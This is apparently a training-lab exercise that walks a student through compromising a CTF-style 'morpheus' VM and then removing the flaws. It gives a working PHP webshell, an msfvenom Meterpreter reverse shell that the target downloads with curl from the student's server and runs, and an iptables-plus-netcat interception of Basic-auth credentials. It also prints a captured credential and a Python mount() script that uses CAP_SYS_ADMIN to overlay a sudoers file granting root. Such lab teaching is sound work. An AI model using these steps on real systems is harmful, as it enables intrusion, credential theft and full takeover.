---
layout: exercise
exercise: 65
title: "Exercise: Advanced Privilege Escalation with Linux Capabilities"
vm: morpheus1
tools: openssh-client nmap dirbuster curl python3 metasploit-framework
directories_to_sync: ssh-config 
---


## Steps

1. Start up a fresh `lxterminal` by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking Run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

    ```
    <hold down Alt><hit F2>lxterminal<HIT the enter key>
    ```

2. Portscan the `morpheus` system across all 65,536 TCP ports like so:

    ```shell
    nmap -sT -p- morpheus
    ```

3. Start by looking at the web server on port `80`. Start up a browser window or a new tab and browse to: <http://morpheus>

4. Notice on the page that it says that we are playing the character of Trinity and that "Cypher" has locked everyone else out of some computer's SSH access.

5. There's nothing else on this page that's useful. Let's check out the other web server via this link - you'll find it's password protected.

    <http://morpheus:81>

6. You can try guessing the password a few times, but let's proceed assuming that it can't be guessed. Let's turn our focus back to the first web server (the one on port `80`) and investigate it with `dirbuster`.

7. Start up `dirbuster`.  You can type `dirbuster` into a terminal window or use the same Run method we used in step 1.

8. Set the "Target URL" to: <http://morpheus/>

9. Use the `directory-list-2.3-small.txt` wordlist:

    a. Click `dirbuster`'s Browse button

    b. Navigate to `/usr/share/dirbuster/wordlists`

    c. Choose the file `directory-list-2.3-small.txt`

10. Deactivate dirbuster's "Be Recursive" toggle.

11. Click `dirbuster`'s Start button to start the scan, then click the "Results - List View" tab to switch to the Results view.

12. When dirbuster finds `/graffiti.php`, click `dirbuster`'s Stop button. `graffiti.php` is all we'll need.  You can exit `dirbuster` if you'd like.

13. Investigate the `graffiti.php` page by visiting this page with your browser: <http://morpheus/graffiti.php>

14. Let's enter a message onto the graffiti wall page. Type `TEXT` into the "Message" text box, like so:

    ```
    TEXT
    ```

15. Click the page's "Post" button to submit the line.

16. Notice how your TEXT is now on the graffiti page.

17. Let's view the source - hit `Ctrl+U`.

18. Notice that there's a form near the end of the source code for this page.  The form submits whatever text you enter in a variable called `message`, but it also uses a hidden form field, which is a variable called `file`.  The variable's value is `graffiti.txt`.  Here's what that part of the source code looks like on our test system:

    ```
    <input type="hidden" name="file" value="graffiti.txt">
    ```

19. Whenever we enter TEXT in the message block and hit the "Post" button, our form sends a `POST` request with these values: `message=TEXT&file=graffiti.txt&submit=submit`.  It seems like submitting this form might be just adding things to a file called `graffiti.txt`. Let's request `graffiti.txt` and see what's in it.  Visit this link in the browser:

    <http://morpheus/graffiti.txt>

20. Notice how that file includes the line `TEXT`. Let's try asking the form to create another file called `vuln`.  Switch back to a terminal window, starting a new tab if necessary, and run this command:

    ```shell
    
    curl -X POST -d 'message=TEXT&file=vuln' http://morpheus/graffiti.php
    ```

21. Now, go back to your browser and request a file called `vuln` from the web server, via this link;

    <http://morpheus/vuln>

22. Notice that you've gained the ability to append text to any file you want into this directory. Think about how you can use this to create a PHP program, or to upload one you already have, line by line.

23. Create a simple PHP webshell file that we can upload, line by line. This file will be a page that checks to see if it has received a `GET` request with a variable set called `cmd`, short for "command".  If it has, it will run that command via PHP's `shell_exec()` function, and display the output. Regardless of whether a command had been submitted, it will display a simple form that takes a text field called `cmd` and has a submit button. Switch back to a terminal window and copy-paste this text to create a file called `webshell.php`.

    ```php
    cat <<END >webshell.php
    <?php
    if (isset(\$_GET['cmd'])) {
       \$cmd = \$_GET['cmd'];
       echo "<pre>";
       echo shell_exec( \$cmd) ;
       echo "</pre>";
       echo "------<br>";
    }
    ?>
    <form method="get">
    <label>command</label><div><input type="text" name="cmd"></div>
    <div><button type="submit">Execute</button></div>
    </form>
    END
    ```

24. Now, let's upload the file line by line, using the same kind of `curl` command we used earlier. We're adding the `-s` flag so that `curl` won't show us speed statistics.  We're piping any other output to `/dev/null`, to avoid seeing the page re-rendered after every single line.

    ```shell
    for line in $(cat webshell.php) ; do
    curl -s -X POST -d file=webshell.php\&message=$line \
       http://morpheus/graffiti.php >/dev/null
    done
    ```

25. Now, go back to your browser and try out your fancy new webshell by following this link:

    <http://morpheus/webshell.php>

26. Type `id` into the command text box and click the "Execute" button.

    ```shell
    id
    ```

27. Notice that the top of the page now shows the output of a Linux `id` command.  On our test system, the output was:

    ```
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

28. This can be an inconvenient way of interacting with a shell. We'll use it to run a Meterpreter instead.  Go back to your terminal window and start a new tab by hitting `Ctrl-Shift-t`.

29. Create an ELF binary meterpreter reverse shell with `msfvenom`, indicating that the meterpreter should connect back to `10.23.58.30` on port `4444`.

    ```shell
    msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp \
       -a x86 LHOST=10.23.58.30 LPORT=4444 -o mrsbin -f elf
    ```

30. Now stage a simple web server here on port `8000` to serve this file:

    ```shell
    python3 -m http.server 8000
    ```

31. Let's set up a Metasploit console that can receive an inbound connection from this meterpreter. Start up a new terminal tab by hitting `Ctrl-Shift-t`.

32. Start up a Metasploit console:

    ```shell
    msfconsole
    ```

33. Set up a multi/handler to catch the shell.  Start by specifying `exploit/multi/handler`:

    ```shell
    use exploit/multi/handler
    ```

34. Set the handler to catch the corresponding payload to the one we specified in our `msfvenom` line:

    ```shell
    set payload linux/x86/meterpreter/reverse_tcp
    ```

35. Set the receiving host to `10.23.58.30`:

    ```shell
    set LHOST 10.23.58.30
    ```

36. Set `ExitOnSession` to `false`, so the handler can catch multiple incoming reverse shell connections:

    ```shell
    set ExitOnSession false
    ```

37. Now start the handler as a background job:

    ```shell
    exploit -j
    ```

38. Go back to your browser, where you have that `webshell.php` form and enter the following into the command text box - this tells the receiving system to download a Meterpreter binary from your web server on port `8000` and place it into `/tmp/mrsbin`:

    ```shell
    curl -o /tmp/mrsbin http://10.23.58.30:8000/mrsbin
    ```

39. Click the "Execute" button.

40. Now enter a new command in the browser `webshell.php` form's text box - this one tells the receiving system to make the Meterpreter binary at `/tmp/mrsbin` executable and to run it.

    ```shell
    chmod 755 /tmp/mrsbin ; /tmp/mrsbin
    ```

41. The browser will seem to be stuck loading the page for a long time.  This is good.  If you checked out your Python web server's output, you'll see that it has logged a `GET` request from the Morpheus machine, requesting the `mrsbin` binary:

    ```
    $ python3 -m http.server 8000
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.23.58.78 - - [05/Aug/2022 02:47:40] "GET /mrsbin HTTP/1.1" 200 -
    ```

42. Go check your Metasploit console. You should now see a line that reads something like "Meterpreter session 1 opened…"

43. Interact with this new session:

    ```shell
    sessions -i 1
    ```

44. Instruct meterpreter to give you a minimal interactive shell. You won't get any immediate feedback from the system, just a "Process … created" and "Channel … created" line from Metasploit.

    ```shell
    shell
    ```

45. Make the shell more interactive by starting a bash process with the `-i` flag:

    ```shell
    bash -i
    ```

46. List out the contents of this directory.

    ```shell
    ls
    ```

47. There's nothing interesting here, so change to the `/` (root) directory.

    ```shell
    cd /
    ```

48. Take a look at the contents of this directory:

    ```shell
    ls
    ```

49. Take a look at the `FLAG.txt` file:

    ```shell
    cat /FLAG.txt
    ```

50. Read the hint - it says we need to figure out how to get Cypher's password, which he gave to Agent Smith so the agent could figure out where to meet Cypher. If you like, view the image this flag file mentions by visiting this link in your browser: <http://morpheus/.cypher-neo.png>

51. Remember that we saw a web server on port 81 that needed a username and password. The flag's hint seemed to indicate that Cypher's password would be necessary for Agent Smith to "meet" with him. Maybe Cypher's username and password will work on that web server?

52. Let's try to escalate privilege and see if we can find a way to get that password. First, try doing a search for Set-UID programs:

    ```shell
    find / -perm -04000 -xdev -ls 2>/dev/null
    ```

53. Notice that all these files are programs that are normally Set-UID, except one: `/usr/sbin/xtables-legacy-multi`

54. `xtables` sounds like it might be similar to `iptables`, the main binary that's traditionally used to administer the kernel-based firewall on Linux systems. Check out the `iptables` binary like so:

    ```shell
    ls -l `which iptables`
    ```

55. Notice that `/usr/sbin/iptables` is a symbolic link to `/etc/alternatives/iptables`.  Check out that file path like so:

    ```shell
    ls -l /etc/alternatives/iptables
    ```

56. Notice that `/etc/alternatives/iptables` is in turn a symbolic link to `/usr/sbin/iptables-nft`. Check out `iptables-nft` like so:

    ```shell
    ls -l /usr/sbin/iptables-nft
    ```

57. Notice that `/usr/sbin/iptables-nft` is in turn a symbolic link to `/usr/sbin/xtables-nft-multi`. But this wasn't the file we were investigating the unusual Set-UID status on. We were looking at `/usr/sbin/xtables-legacy-multi`. Still, perhaps the `/usr/sbin/xtables-legacy-multi` program is calling `/usr/sbin/xtables-nft-multi`.

58. Let's try running an `iptables` command with our current user context (`www-data`) and see if we're able to do things.

    ```shell
    iptables -L
    ```

59. Notice that it worked! So we can likely create a firewall rule. What if we could use it to intercept Agent Smith logging into the web server on port `81`, so we could get the password for ourselves?

60. Construct a firewall rule to redirect any traffic that is headed to port `81` to port `9999` instead, where we'll set up a `netcat` listener:

    ```shell
    
    iptables -t nat -I PREROUTING -p tcp --dport 81 -j REDIRECT --to 9999
    ```

61. Set up a `netcat` listener to catch incoming traffic on port `9999`:

    ```shell
    nc -l -p 9999
    ```

62. Wait for a little bit - eventually, you'll see an HTTP request that has an `Authorization` header in it. Here's a copy of the request on our test system:

    ```
    GET / HTTP/1.1
    Host: 172.17.0.1:81
    User-Agent: Go-http-client/1.1
    Authorization: Basic Y3lwaGVyOmNhY2hlLXByb3N5LXByb2NlZWRzLWNsdWUtZXhwaWF0ZS1hbW1vLXB1Z2lsaXN0
    Accept-Encoding: gzip
    ```

63. When you see a request come in with an `Authorization: Basic` line, copy the rest of the line after the word "Basic". The string you're looking for begins with `Y3lwaGV` and ends with `saXN0`.

64. Decode the copied string with the `base64` command, like so:

    ```
    echo "THE_STRING_YOU_GOT" | base64 -d ; echo ""
    ```

65. Review the decoded contents of the string. They will start with `cypher:` indicating that they are credentials where the username is `cypher` and the password is the text after the colon (`:`) character.

66. Copy the password - it begins with `cache-` and ends with `-pugilist`.

67. Now, start a new terminal window/tab and SSH into the `morpheus` system, using the username `cypher`.  When prompted for a password, use the decoded password you just copied. 

    *Note: we've removed copy-paste from this shell command so you won't overwrite your copy-paste buffer (which has cypher's password in it).*

    ```
    ssh cypher@morpheus
    ```

68. You've made it into the `morpheus` server! List the current directory contents in `cypher`'s home directory:

    ```shell
    ls
    ```

69. Look at the `FLAG.txt` file in this directory:

    ```shell
    cat FLAG.txt
    ```

70. Notice that the flag file challenges us to find a path to root.

71. We know there aren't any other unusual Set-UID programs.  Let's see if there are any programs that grant some of root's special powers, that is, one or more capabilities. Run `getcap` to look for programs that have capabilities to grant. Do it first in the `/bin` directory:

    ```shell
    /usr/sbin/getcap -r /bin
    ```

72. Notice that there were none in the `/bin` directory. Now try it in the `/sbin` directory:

    ```shell
    /usr/sbin/getcap -r /sbin
    ```

73. There weren't any in the `/sbin` directory. Let's try `/usr` now.

    ```shell
    /usr/sbin/getcap -r /usr
    ```

74. Notice that the output tells us that the `ping` program provides the `CAP_NET_RAW` capability. This is particularly instructive, since `ping` did not have Set-UID root active on this system. In the past, `ping` had to be Set-UID to allow non-root users to run it, as `ping` needs to craft packets using "RAW" sockets. Now, file capabilities allow anyone to run `ping`, but running `ping` only grants those users one of root's capabilities: `CAP_NET_RAW`. Should an attacker ever find a vulnerability in the `ping` command, the attacker can't get full root privilege, but simply the abilities in the `CAP_NET_RAW` capability.

75. Notice that the `getcap` output also tells us that the `xtables-legacy-multi` and `xtables-nft-multi` programs grant the `CAP_NET_ADMIN` capability. Finally, the output tells us that the `python3-9` binary grants the `cap_sys_admin` capability. Let's look into this capability.

76. Read the capabilities man page.

    ```shell
    man capabilities
    ```

77. Notice that the `CAP_SYS_ADMIN` entry says that it allows a program to `Perform a range of system administration operations including: quotactl(2),  mount(2),...`. `mount` sounds particularly interesting.

78. When the Linux man pages have a number inside parentheses, like "(2)", this refers to a particular section of the man pages. Read the man page for `man` to learn what section 2 means.

    ```shell
    man man
    ```

79. Notice that section 2 is used for `2   System calls (functions provided by the kernel)`.  So `CAP_SYS_ADMIN` doesn't give us special privilege to run the `mount` binary, but instead to use the `mount` system call.

80. Take a look at the section 2 man page for mount:

    ```shell
    man 2 mount
    ```

81. Notice that the man page discusses the C-based `mount()` function.

82. We need a Python program that calls `mount()`, since the `python3-9` is our path to the `CAP_SYS_ADMIN` capability. Write this program code out to a file, like so:

    ```python
    cat <<END >mount.py
    #!/usr/bin/python3-9

    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--source', dest="src", required=True, help="source file or directory to mount on target")
    parser.add_argument('-t', '--target', dest="target", required=True, help="target mount point")
    parser.add_argument('-f', '--filesystemtype', dest="type", required=False, help="filesystem type - defaults to none",default="none")
    args = parser.parse_args()
    item = vars(args)

    from ctypes import *
    libc = CDLL("libc.so.6")
    libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
    MS_BIND = 4096
    source = bytes(item["src"],'utf-8')
    target = bytes(item["target"], 'utf-8')
    print(f"Mounting {source} onto {target}")
    filesystemtype = bytes(item["type"],'utf-8')
    options = b"rw"
    mountflags = 0
    if (item["type"] == "none"):
       mountflags = MS_BIND
    else:
       mountflags = 0
    libc.mount(source, target, filesystemtype, mountflags, options)

    END
    ```

83. Set the `mount.py` program executable:

    ```shell
    chmod 755 mount.py
    ```

84. Run the `mount.py` program with the `-h` argument to see the help:

    ```shell
    ./mount.py -h
    ```

85. We will use this program to mount our own `sudoers` file on top of the existing one. Construct a simple `sudoers` file that allows the `cypher` user to run any command as root, without needing to type a password:

    ```shell
    echo "cypher ALL=(ALL) NOPASSWD: ALL" >sudoers
    ```

86. Now, use our `mount.py` program to mount this `sudoers` file onto `/etc/sudoers`:

    ```shell
    ./mount.py -s ./sudoers -t /etc/sudoers -f none
    ```

87. Now try using the `sudo` command to `sudo su -` to become root - this will fail, but pay attention to the reason given:

    ```shell
    sudo su -
    ```

88. Notice that the output says the problem is that our replacement `sudoers` file is owned by uid `1001`, but needs to be owned by uid `0`. We need to find some way of getting this file to be owned by user ID (uid) `0`, or we need to pick a different file to mount. There are likely a number of ways for us to use our mounting privileges to get to root, but let's keep pursuing this one.

89. Let's look for any unusual cron job files. First, look in `/etc/cron.d/`:

    ```shell
    ls /etc/cron.d
    ```

90. Review the `fix-ownership-on-crew` cron job file, like so:

    ```shell
    cat /etc/cron.d/fix-ownership-on-crew
    ```

91. This cron entry runs `chown -R root /crew` every minute, setting the owner of any file in the `/crew` directory to `root`. Check to see if we can write to this directory with our current user:

    ```shell
    ls -ld /crew
    ```

92. Notice that the directory is writable by the `humans` group.

93. Run an `id` command to determine if our current `cypher` user is in this group:

    ```shell
    id
    ```

94. Notice that `cypher` is in the `humans` group.

95. Write a new `sudoers` file in the `/crew` directory:

    ```shell
    echo "cypher ALL=(ALL) NOPASSWD: ALL" >/crew/sudoers
    ```

96. Wait one minute for the cron job to change the owner of the `/crew/sudoers` file to root. To make this predictable, run a sleep command:

    ```shell
    sleep 60
    ```

97. Confirm that the file is owned by `root`:

    ```shell
    ls -l /crew/sudoers
    ```

98. Mount the `/crew/sudoers` file onto `/etc/sudoers`:

    ```shell
    ./mount.py -s /crew/sudoers -t /etc/sudoers -f none
    ```

99. Now, try `sudo su -` again:

    ```shell
    sudo su -
    ```

100. List the `root` home directory:

        ```shell
        ls
        ```

101. Read the `FLAG.txt` file! You win!

        ```shell
        cat FLAG.txt
        ```

102. Let's fix the escalation path we came in on. First, remove `CAP_SYS_ADMIN` from the python binary:

        ```shell
        setcap -r /usr/bin/python3-9
        ```

103. Let's observe that the `CAP_NET_ADMIN` capability lets ordinary users modify the firewall - `iptables` was a multi-step symbolic link to `/usr/sbin/xtables-nft-multi`. This program didn't need to be Set-UID to let non-root users modify the firewall, so long as it had the `CAP_NET_ADMIN` capability. Just to be sure, let's remove Set-UID from the other related program, `/usr/sbin/xtables-legacy-multi`.

        ```shell
        chmod u-s /usr/sbin/xtables-legacy-multi
        ```

104. Next, switch to the `cypher` user:

        ```shell
        su - cypher
        ```

105. Now, add another firewall rule:

        ```shell
        /usr/sbin/iptables -t nat -I PREROUTING \
        -p tcp --dport 82 -j REDIRECT --to 9999
        ```

106. Observe the firewall rule is in place, proving to yourself that Set-UID wasn't what was letting us modify firewall rules:

        ```shell
        /usr/sbin/iptables -t nat -L PREROUTING
        ```

107. Switch back to the `root` user:

        ```shell
        exit
        ```

108. Remove the `CAP_NET_ADMIN` capability from `/usr/sbin/xtables-nft-multi`:

        ```shell
        setcap -r /usr/sbin/xtables-nft-multi
        ```

109. Switch to the `cypher` user again:

        ```shell
        su - cypher
        ```

110. Try listing the firewall rules - this will produce an error message:

        ```shell
        /usr/sbin/iptables -L
        ```

111. Notice that we're not able to list the firewall rules anymore, since our binary doesn't have the `CAP_NET_ADMIN` capability. Here is the output on our test system:

        ```
        iptables v1.8.7 (nf_tables): Could not fetch rule set generation id: Permission denied (you must be root)
        ```

112. Read the capabilities man page's section on the `CAP_NET_ADMIN` capability to understand why this capability is what allows the root user to manage the firewall.

        ```shell
        man capabilities
        ```

113. Here's the relevant section of that man page from our test system:

       ```
               CAP_NET_ADMIN
              Perform various network-related operations:
              * interface configuration;
              * administration of IP firewall, masquerading, and accounting;
              * modify routing tables;
              * bind to any address for transparent proxying;
              * set type-of-service (TOS);
              * clear driver statistics;
              * set promiscuous mode;
              * enabling multicasting;
              * use  setsockopt(2)  to  set  the following socket options: SO_DEBUG, SO_MARK, SO_PRIORITY
                (for a priority outside the range 0 to 6), SO_RCVBUFFORCE, and SO_SNDBUFFORCE.
       ```

114. This exercise is done. Close the terminal windows or tabs you used for this exercise.  Quit `dirbuster` if you haven't already.
